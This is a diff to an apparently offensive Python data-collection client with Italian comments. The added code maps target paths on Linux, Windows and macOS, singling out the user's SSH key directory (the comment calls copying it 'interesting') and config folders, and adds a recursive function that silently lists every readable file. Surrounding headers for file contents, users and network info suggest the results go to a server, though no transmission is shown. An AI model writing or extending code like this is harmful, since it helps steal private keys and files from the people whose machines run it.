@@ -21,6 +21,25 @@ __headers_type = {"1": b"<File-Name>", "2": b"<File-Content>", "3": b"<File-Not-
                   "7": b"<Partition-disk-info>", "8": b"<Partition-disk-status>", "9": b"<IO-connected>", "10": b"<Network-info>", "11": b"<Users>"}
 
 
+__filesystem_hierarchy = {"1": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
+                          "2": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
+                          "3": [f"/home/{os.getlogin()}/.ssh/"],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
+                          "4": [],  # Recupero Immagini (?)
+                          "5": [],  # Recupero Documenti (?)
+                          "6": [f"/home/{os.getlogin()}/.config/"],  # Recupero File di config (?)
+                          }
+
+
+# Da preferire in quanto non restituisce nulla nel caso in cui si stia cercando di leggere una directory senza permessi
+def get_path_content(current_position: str) -> list:
+    """Funzione per il recupero del contenuto di directory e file dato un path."""
+    total_files = []
+    for path, dirs, files in os.walk(current_position):
+        for filename in files:
+            total_files.append(os.path.join(path, filename))
+    return total_files
+
+
 def test_connection(hostname: str, port: int) -> bool:
     """Funzione di controllo per lo stato del server (in ascolto o meno)."""
     """Variante della funzione port_validator."""
